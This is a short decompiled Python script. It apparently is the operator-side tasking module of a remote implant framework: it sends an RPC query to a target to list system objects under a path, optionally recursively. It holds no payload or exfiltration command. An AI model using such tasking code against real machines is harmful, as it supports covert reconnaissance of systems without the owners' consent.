# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.6.0b2 (default, Oct 11 2016, 05:27:10) 
# [GCC 6.2.0 20161005]
# Embedded file name: Mcl_Cmd_Objects_Tasking.py


def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.status.cmd.objects', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.status.cmd.objects.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.status.cmd.objects.Params()
    if lpParams['path'] != None:
        tgtParams.path = lpParams['path']
    if lpParams['recursive']:
        tgtParams.flags |= mca.status.cmd.objects.PARAMS_FLAG_RECURSIVE
    if len(tgtParams.path) == 0:
        tgtParams.path = '\\'
    rpc = mca.status.cmd.objects.tasking.RPC_INFO_QUERY
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    taskXml = mcl.tasking.Tasking()
    taskXml.AddSearchPath(tgtParams.path)
    if tgtParams.flags & mca.status.cmd.objects.PARAMS_FLAG_RECURSIVE:
        taskXml.SetRecursive()
    mcl.tasking.OutputXml(taskXml.GetXmlObject())
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.status.cmd.objects.errorStrings)
        return False
    else:
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)